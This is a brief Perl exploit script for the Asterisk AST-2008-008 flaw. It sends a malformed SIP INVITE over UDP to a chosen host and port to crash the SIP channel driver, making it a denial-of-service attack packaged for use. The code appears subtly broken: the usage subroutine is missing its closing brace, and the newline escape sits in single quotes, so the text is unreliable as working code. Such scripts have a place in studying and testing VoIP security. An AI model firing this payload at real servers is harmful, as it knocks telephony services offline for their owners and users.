#!/usr/bin/perl -w
###############


# asterisk AST-2008-008
# by armando.j.m.o@gmail.com
#AST-2008-008 - Remote Crash Vulnerability in SIP channel driver when run in pedantic mode

use Getopt::Std;
use IO::Socket;
use strict;

my %args;
getopts("h:p:", \%args);

if (!$args{h} || !$args{p}) { usage(); }


my $sock = IO::Socket::INET->new(
    Proto    => 'udp',
    PeerPort => $args{p},
    PeerAddr => $args{h},
) or die "Could not create socket: $!\n";

$sock->send('INVITE sip:1234@'.$args{h}.' SIP/2.0\n
CSeq: 2 INVITE') or die "Send error: $!\n";




sub usage {
    print STDERR
qq{ $0

Usage: $0 -h <host> -p <port>
        -h <host>       = host
        -p <port>       = port

Example:
        $0 -h target -p port


};
